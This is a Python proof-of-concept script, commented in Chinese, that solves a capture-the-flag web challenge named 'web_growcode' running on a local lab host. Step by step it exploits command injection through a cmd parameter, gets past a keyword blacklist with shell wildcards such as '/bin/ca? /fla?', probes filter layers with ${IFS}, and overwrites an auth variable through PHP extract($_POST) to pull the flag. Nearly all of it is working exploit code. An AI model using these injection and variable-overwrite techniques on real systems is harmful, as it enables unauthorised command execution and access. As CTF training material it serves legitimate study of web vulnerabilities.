#!/usr/bin/env python3
# web_growcode 利用链 PoC：按解题步骤逐步请求，最终取得 flag。
# 用法：python exp.py [BASE_URL]
#   默认 BASE_URL = http://127.0.0.1:58002
import re
import sys

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:58002").rstrip("/")
S = requests.Session()


def code_lines(html: str) -> int:
    """页面当前展示的源码行数（行数随触发层级向下生长）"""
    m = re.search(r'<pre class="ln">(.*?)</pre>', html, re.S)
    return m.group(1).count("\n") + 1 if m else 0


def echo(html: str) -> str:
    """提取回显区文本（命令回显/拦截提示/命令输出）"""
    m = re.search(r'<pre class="out">(.*?)</pre>', html, re.S)
    return re.sub(r"<[^>]+>", "", m.group(1)).strip() if m else ""


step = 0


def show(msg: str) -> None:
    global step
    step += 1
    print(f"\n=== 步骤 {step}: {msg}")


# 1. 开局：页面是一段朴素的小脚本，?cmd 可直接执行命令
show("开局侦察，执行 ls /")
r = S.get(f"{BASE}/?cmd=ls%20/")
print(f"源码行数={code_lines(r.text)}（初始 7 行）")
print(echo(r.text))

# 2. 尝试读 flag：命中黑名单被拦截，页面长出 v2 敏感词过滤代码
show("cat /flag，触发第二层")
r = S.get(f"{BASE}/?cmd=cat%20/flag")
print(f"源码行数={code_lines(r.text)}")
print(echo(r.text))

# 3. 黑名单拦明文子串，通配符由 shell 展开、不经过 PHP 正则：
#    /bin/ca? /fla? 读到的是诱饵假 flag 与指引
show("通配符拆词读 /flag")
r = S.get(f"{BASE}/?cmd=/bin/ca?%20/fla?")
print(echo(r.text))

# 4. 假 flag 指引"真凭证不在磁盘上"；带管道的分隔符试探会撞上 v3
#    （去空白 + 限长 16），免空格绕过在 busybox ash 下全部失效——纯墙层
show("分隔符试探，撞上第三层")
r = S.get(f"{BASE}/?cmd=ls%20/%20|%20grep%20fla")
print(f"源码行数={code_lines(r.text)}")
print(echo(r.text))

# 5. 更特殊的语法（$/`/{ 或任意 POST 体）触发终版代码：
#    $auth=false 后 extract($_POST)，POST 的 auth 键直接覆盖 $auth
show("触发第四层，读出通关条件")
r = S.get(f"{BASE}/?cmd=%24%7BIFS%7D")
print(f"源码行数={code_lines(r.text)}")

# 6. 复合请求通关：地址栏短指令 cmd=s（天然满足 16 字符限制）
#    + 数据包密钥 auth=admin（extract 变量覆盖），输出内存中的真 flag
show("GET /?cmd=s + POST auth=admin，通关")
r = S.post(f"{BASE}/?cmd=s", data={"auth": "admin"})
result = echo(r.text)
print(result)

m = re.search(r"[Hh][Cc][Tt][Ff]\{[^}<]*\}", result)
print(f"\n[+] FLAG: {m.group(0)}" if m else "\n[-] 未取到 flag，检查部署")
